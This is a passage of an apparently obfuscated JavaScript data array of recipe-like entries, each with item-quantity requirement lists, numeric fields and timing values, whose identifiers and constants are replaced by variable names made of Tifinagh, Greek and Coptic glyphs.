			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⲆⲆΔᐃ,
			time: .16666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ⲆΔᐃⵠⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 10]
			],
			w: 0,
			f: ⵠⲆᐃⵠ,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃⲆΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⲆΔⲆ,
			time: ⲆⵠⲆⲆ / ΔⲆΔᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔᐃⲆΔⲆ, ⵠΔᐃ],
				[ᐃᐃ.ⵠⲆⲆᐃ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 15]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠᐃⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠᐃⵠΔ,
			time: ⵠᐃⵠΔ / ⵠⵠⲆⵠΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 20],
				[ᐃᐃ.ᐃᐃΔⲆ, 30],
				[ᐃᐃ.ⲆⵠᐃⵠΔ, ΔⲆⵠ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔΔⲆⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⲆⵠⲆ,
			time: ΔⲆⵠ / ΔᐃΔⵠⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 20],
				[ᐃᐃ.ΔⲆⵠⵠ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 80],
				[ᐃᐃ.ΔΔⲆⵠⲆ, ⵠᐃⵠΔ]
			],
			w: 1,
			f: ⲆⲆⲆᐃ,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: ᐃΔΔ,
			id: ᐃᐃⲆ.ⵠⲆⲆΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⲆΔⲆ,
			time: ΔΔΔ / 20,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 60],
				[ᐃᐃ.ⲆⵠΔⲆ, 30],
				[ᐃᐃ.ⵠⲆⲆΔⲆ, ⲆⵠⲆⲆ]
			],
			w: ⵠΔᐃ,
			f: ΔΔⵠⵠ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⵠΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⵠΔᐃ,
			time: ᐃΔᐃⲆ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 30],
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ⲆΔᐃᐃ, 30],
				[ᐃᐃ.ⵠⲆⵠΔᐃ, 1]
			],
			w: ⵠᐃⵠΔ,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆᐃΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆᐃΔⲆ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 90],
				[ᐃᐃ.ᐃᐃΔⲆ, 50]
			],
			w: ⵠⲆΔ,
			f: 0,
			"ᐃⲆΔ": Δⵠᐃ,
			e: Δᐃᐃᐃ,
			id: ᐃᐃⲆ.ΔⵠⲆΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆΔⲆ,
			time: 1 / ⲆⲆⲆΔᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 160],
				[ᐃᐃ.ᐃᐃΔⲆ, 120],
				[ᐃᐃ.ΔⲆⵠⵠ, 80],
				[ᐃᐃ.ΔⵠⲆΔⲆ, Ⲇᐃⵠ]
			],
			w: ⵠΔⲆ,
			f: ᐃΔΔ,
			"ᐃⲆΔ": ᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ⲆᐃⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃⵠΔⲆ,
			time: ᐃᐃⵠ / ΔⲆΔⲆⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 80],
				[ᐃᐃ.ᐃᐃΔⲆ, 200],
				[ᐃᐃ.ΔⲆⵠⵠ, 150],
				[ᐃᐃ.ⲆᐃⵠΔⲆ, ⵠΔᐃ]
			],
			w: 1,
			f: Δᐃᐃᐃ,
			"ᐃⲆΔ": 0,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ᐃᐃᐃⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃᐃⲆⵠ,
			time: 1 / ⲆⵠᐃᐃⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 160],
				[ᐃᐃ.ⲆⵠΔⲆ, 60],
				[ᐃᐃ.ΔⲆⵠⵠ, 250],
				[ᐃᐃ.ᐃᐃᐃⲆⵠ, ᐃᐃⲆΔ]
			],
			w: 1,
			f: ⲆΔⵠ,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: Δⵠᐃ,
			id: ᐃᐃⲆ.ⲆⵠⵠⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⵠⲆⵠ,
			time: .016666666666666666,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 160],
				[ᐃᐃ.ⲆΔᐃᐃ, 60],
				[ᐃᐃ.ΔⲆᐃΔ, 250],
				[ᐃᐃ.ⲆⵠⵠⲆⵠ, ᐃⲆᐃ]
			],
			w: 1,
			f: ᐃⵠⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔΔΔⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔΔⵠΔ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔΔΔⵠΔ, 1],
				[ᐃᐃ.ⵠⲆᐃᐃᐃ, 1],
				[ᐃᐃ.ᐃⲆᐃⲆᐃ, 1],
				[ᐃᐃ.ⲆⲆⲆᐃᐃ, 10],
				[ᐃᐃ.ⲆⵠΔⲆ, 20]
			],
			w: 1,
			f: 1,
			"ᐃⲆΔ": ⲆΔⵠ,
			e: 0,
			id: ᐃᐃⲆ.ᐃⵠⵠⵠᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃⵠⵠⵠᐃ,
			time: ⵠⲆΔ / 120,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 30],
				[ᐃᐃ.ᐃᐃΔⲆ, ⵠⵠⵠⵠΔ]
			],
			w: 1,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": 0,
			e: ΔΔⵠⵠ,
			id: ᐃᐃⲆ.ΔⵠⵠΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⵠΔᐃ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔⵠⵠΔᐃ, 1],
				[ᐃᐃ.ΔⲆⵠⵠ, 20],
				[ᐃᐃ.ᐃᐃΔⲆ, 30],
				[ᐃᐃ.ⵠⲆⲆᐃ, 40]
			],
			w: ⵠᐃⵠΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ΔΔⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⲆⵠΔ,
			time: ⵠΔⲆ / 10,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ΔΔⲆⵠΔ, 1],
				[ᐃᐃ.ΔⲆᐃΔ, 20],
				[ᐃᐃ.ΔⲆⵠⵠ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 80]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⵠᐃΔΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃΔΔᐃ,
			time: 1 / ⲆᐃᐃΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃΔΔᐃ, ᐃΔᐃⲆ],
				[ᐃᐃ.ΔⲆⵠⵠ, 60],
				[ᐃᐃ.ⲆⵠΔⲆ, 30],
				[ᐃᐃ.ΔⲆᐃΔ, 40]
			],
			w: ⵠΔΔ,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": ᐃⵠⲆ,
			e: ΔⲆⲆ,
			id: ᐃᐃⲆ.ⵠᐃᐃⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃᐃⲆΔ,
			time: ⵠᐃⵠΔ / 40,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 50]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: ΔⲆⵠⲆ,
			id: ᐃᐃⲆ.ⵠᐃⲆᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃⲆᐃⵠ,
			time: ΔΔΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⲆᐃⵠ, ᐃΔᐃⲆ]
			],
			w: ᐃΔΔ,
			f: ᐃⵠΔ,
			"ᐃⲆΔ": ⲆⵠⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⲆⵠⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⲆⵠⵠ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, ᐃⵠΔᐃᐃ],
				[ᐃᐃ.ᐃᐃΔⲆ, 50]
			],
			w: ⵠⲆΔ,
			f: 0,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ᐃΔⲆᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⲆᐃᐃ,
			time: .1,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ᐃΔⲆᐃᐃ, ᐃΔᐃⲆ],
				[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ, ΔⲆⵠ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⲆ,
			e: ΔΔⵠ,
			id: ᐃᐃⲆ.ⵠΔᐃⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔᐃⵠΔ,
			time: 1 / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠΔⵠΔⲆ, ⵠΔᐃΔ],
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⵠΔΔᐃΔ],
				[ᐃᐃ.ΔᐃᐃᐃΔ, ⵠΔᐃΔ]
			],
			w: ⵠΔᐃ,
			f: ΔᐃΔΔ,
			"ᐃⲆΔ": ᐃⵠΔ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠⲆⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⲆⵠⲆ,
			time: .06666666666666667,
			"ΔᐃⲆ": ⵠⲆΔᐃ.Δⵠⵠⵠᐃ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 40]
			],
			w: ΔⲆⲆ,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆⵠΔⲆ,
			time: 1 / ΔᐃΔⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⵠΔⲆ, 1],
				[ᐃᐃ.ⵠⲆⲆᐃ, 60],
				[ᐃᐃ.ᐃᐃΔⲆ, ⵠⵠⲆΔΔ]
			],
			w: ⵠΔᐃ,
			f: 0,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠΔΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠΔΔⲆ,
			time: ⵠΔΔ / ⲆⲆᐃΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 80],
				[ᐃᐃ.ΔⲆⵠⵠ, 30],
				[ᐃᐃ.ᐃᐃΔⲆ, 30],
				[ᐃᐃ.ΔⵠΔΔⲆ, ᐃΔᐃⲆ]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠⲆΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠⲆΔⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ,
			time: ᐃᐃⲆΔ / ⵠⲆⲆⲆⲆ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 200],
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 60],
				[ᐃᐃ.ⵠⵠⲆΔⲆ, 1]
			],
			w: ΔⲆⵠ,
			f: 0,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃΔΔΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃΔΔΔ,
			time: .03333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⵠΔⲆ, 40],
				[ᐃᐃ.ΔⲆᐃΔ, 80],
				[ᐃᐃ.ΔⲆⵠⵠ, 90],
				[ᐃᐃ.ΔᐃΔΔΔ, ΔⲆⵠ]
			],
			w: Ⲇᐃⵠ,
			f: ΔⲆⵠⲆ,
			"ᐃⲆΔ": ⲆⲆⲆᐃ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆΔᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆΔᐃΔ,
			time: 1 / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔᐃᐃ, 40],
				[ᐃᐃ.ⲆⵠΔⲆ, 80],
				[ᐃᐃ.ΔⲆᐃΔ, 90],
				[ᐃᐃ.ⲆⲆΔᐃΔ, 1]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⲆⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆⲆᐃ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔΔΔΔᐃ, 20],
				[ᐃᐃ.ⵠⵠⵠΔⵠ, Ⲇᐃⵠ],
				[ᐃᐃ.ⲆⵠΔⲆ, 100],
				[ᐃᐃ.ⵠΔⲆⲆᐃ, ⵠΔΔΔΔ]
			],
			w: 1,
			f: ⵠΔᐃ,
			"ᐃⲆΔ": 1,
			e: 0,
			id: ᐃᐃⲆ.ⲆⲆⵠᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⲆⵠᐃⵠ,
			time: ᐃᐃⲆΔ / 120,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⵠᐃⵠ, ⵠΔᐃ],
				[ᐃᐃ.ⵠΔᐃⲆⲆ, 1],
				[ᐃᐃ.ⲆΔᐃᐃ, 100],
				[ᐃᐃ.ⲆᐃⵠΔΔ, 2]
			],
			w: ⵠᐃⵠΔ,
			f: 1,
			"ᐃⲆΔ": 1,
			e: 0,
			id: ᐃᐃⲆ.ΔⲆⲆΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⲆⲆΔᐃ,
			time: .005,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⵠΔⲆ, ᐃᐃⲆΔ],
				[ᐃᐃ.ᐃΔΔΔⵠ, 5],
				[ᐃᐃ.ᐃᐃᐃΔΔ, 6]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ᐃᐃΔⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃᐃΔⲆΔ,
			time: .03333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 30]
			],
			w: ᐃΔΔ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: ⲆⲆⲆᐃ,
			id: ᐃᐃⲆ.ΔΔⵠᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔΔⵠᐃᐃ,
			time: ⵠΔᐃ / ΔⵠⲆⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 50],
				[ᐃᐃ.ᐃᐃΔⲆ, 25],
				[ᐃᐃ.ΔΔⵠᐃᐃ, ⵠΔᐃ]
			],
			w: ΔⲆⵠ,
			f: ΔⲆⲆ,
			"ᐃⲆΔ": 0,
			e: ΔΔⵠ,
			id: ᐃᐃⲆ.ⲆᐃⵠΔᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃⵠΔᐃ,
			time: 1 / ᐃΔᐃΔⲆ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆᐃ, 60],
				[ᐃᐃ.ΔⲆⵠⵠ, 40],
				[ᐃᐃ.ᐃᐃΔⲆ, 50],
				[ᐃᐃ.ⲆᐃⵠΔᐃ, 1]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ⲆΔⵠ,
			id: ᐃᐃⲆ.ⵠᐃⲆⵠΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠᐃⲆⵠΔ,
			time: 1 / ᐃΔᐃⲆⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 40],
				[ᐃᐃ.ΔⲆⵠⵠ, 60],
				[ᐃᐃ.ᐃᐃΔⲆ, 80],
				[ᐃᐃ.ⵠᐃⲆⵠΔ, ⵠΔᐃ]
			],
			w: 1,
			f: 0,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: 0,
			id: ᐃᐃⲆ.ᐃΔⵠᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⵠᐃⵠ,
			time: .03333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 60],
				[ᐃᐃ.ΔⲆⵠⵠ, ⵠⲆⲆᐃⵠΔⵠ],
				[ᐃᐃ.ⲆⵠΔⲆ, 40],
				[ᐃᐃ.ᐃΔⵠᐃⵠ, ⵠΔΔ]
			],
			w: ᐃᐃⲆΔ,
			f: 0,
			"ᐃⲆΔ": ᐃΔΔ,
			e: ᐃⵠⲆ,
			id: ᐃᐃⲆ.ⵠⵠᐃⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠᐃⲆⲆ,
			time: Ⲇᐃⵠ / 60,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ΔⲆᐃΔ, 100],
				[ᐃᐃ.ⲆⵠΔⲆ, 80],
				[ᐃᐃ.ⲆΔᐃᐃ, 40],
				[ᐃᐃ.ⵠⵠᐃⲆⲆ, ⵠΔⲆ]
			],
			w: ΔΔΔ,
			f: ⲆⲆⲆᐃ,
			"ᐃⲆΔ": ΔⲆⵠⲆ,
			e: ⵠⲆⲆ,
			id: ᐃᐃⲆ.ⲆⵠⵠᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⵠᐃΔ,
			time: .011111111111111112,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ᐃⲆⲆⲆΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆΔⲆⲆ, 3]
			],
			w: ᐃΔΔ,
			f: ᐃⲆᐃ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ΔΔⵠⵠ,
			id: ᐃᐃⲆ.ⵠΔⵠᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⵠᐃΔ,
			time: ᐃᐃⲆΔ / ΔⲆΔΔ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆⲆⲆⵠ, ΔᐃⲆΔ]
			],
			w: 0,
			f: 1,
			"ᐃⲆΔ": ⵠΔⲆⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⲆⵠⲆΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆⵠⲆΔⲆ,
			time: Ⲇᐃⵠ / ᐃᐃⲆᐃ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⲆⲆⵠΔΔ, 8]
			],
			w: ΔⲆⲆ,
			f: ⵠΔⲆ,
			"ᐃⲆΔ": ⵠⲆᐃⵠ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠΔⲆⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠΔⲆⵠ,
			time: ᐃᐃⵠ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⲆΔⵠΔⵠ, 8]
			],
			w: 0,
			f: 1,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⲆⲆⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⲆⲆⵠⲆ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃⵠᐃΔΔ, 8]
			],
			w: 0,
			f: 1,
			"ᐃⲆΔ": ᐃΔΔ,
			e: 0,
			id: ᐃᐃⲆ.ⵠⵠᐃⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠⵠᐃⵠⲆ,
			time: ⵠⲆΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆΔⲆΔ, 8]
			],
			w: 0,
			f: ⵠⲆΔ,
			"ᐃⲆΔ": ΔᐃΔΔ,
			e: ⵠΔⲆⵠ,
			id: ᐃᐃⲆ.ΔᐃⲆᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⲆᐃⵠ,
			time: ΔⲆⵠ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃⲆⲆᐃⵠ, 8]
			],
			w: ⲆⲆⲆᐃ,
			f: 1,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ⵠΔⲆᐃΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⵠΔⲆᐃΔ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ΔΔΔᐃⲆ, ᐃⲆⲆΔΔⵠΔ]
			],
			w: ΔΔⵠⵠ,
			f: ⲆⵠⲆⲆ,
			"ᐃⲆΔ": 0,
			e: ⵠⲆᐃⵠ,
			id: ᐃᐃⲆ.ᐃΔⵠⵠⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ᐃΔⵠⵠⲆ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⵠᐃⲆᐃ, ᐃᐃΔⵠⵠⵠΔ]
			],
			w: 0,
			f: 1,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔᐃⲆⲆΔ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔᐃⲆⲆΔ,
			time: ΔΔΔ / 5,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠⲆᐃⲆⵠ, ⵠΔᐃ]
			],
			w: 0,
			f: ⵠΔⲆ,
			"ᐃⲆΔ": 0,
			e: ᐃⵠΔ,
			id: ᐃᐃⲆ.ⲆᐃⲆⲆⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆᐃⲆⲆⲆ,
			time: ⵠΔⲆ / ᐃⲆⵠⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃΔΔΔΔ, Ⲇᐃⵠ]
			],
			w: ΔⲆⵠⲆ,
			f: ᐃᐃⲆΔ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.Ⲇⵠᐃᐃⵠ,
			"ⵠΔᐃⲆ": ᐃᐃ.Ⲇⵠᐃᐃⵠ,
			time: 1 / ⵠⵠⵠⵠ,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⲆⵠᐃ, ᐃⲆΔⵠ]
			],
			w: Δⵠᐃ,
			f: 1,
			"ᐃⲆΔ": ⵠⲆⲆ,
			e: 0,
			id: ᐃᐃⲆ.ⲆΔⵠΔⲆ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔⵠΔⲆ,
			time: .3333333333333333,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⲆⵠᐃ, ⲆΔⵠⵠ],
				[ᐃᐃ.ⵠⲆΔⲆⲆ, 1]
			],
			w: ᐃΔΔ,
			f: Ⲇᐃⵠ,
			"ᐃⲆΔ": 0,
			e: 0,
			id: ᐃᐃⲆ.ΔⵠⲆᐃᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ΔⵠⲆᐃᐃ,
			time: ᐃᐃⵠ / 3,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ⵠᐃⲆⵠᐃ, 5],
				[ᐃᐃ.ⵠⲆΔⲆⲆ, 2],
				[ᐃᐃ.ᐃⵠⲆⲆΔ, ΔⲆΔΔΔ]
			],
			w: 0,
			f: ᐃᐃⵠ,
			"ᐃⲆΔ": ΔΔⵠⵠ,
			e: Δᐃᐃᐃ,
			id: ᐃᐃⲆ.ⲆΔΔⲆᐃ,
			"ⵠΔᐃⲆ": ᐃᐃ.ⲆΔΔⲆᐃ,
			time: .2,
			"ΔᐃⲆ": ⵠⲆΔᐃ.ΔᐃΔⵠΔ
		}, {
			r: [
				[ᐃᐃ.ᐃᐃᐃΔΔ, ⲆᐃᐃⲆ]
			],
			w: ᐃⲆᐃ,
			f: 0,
			"ᐃⲆΔ": 0,
			e: 0,
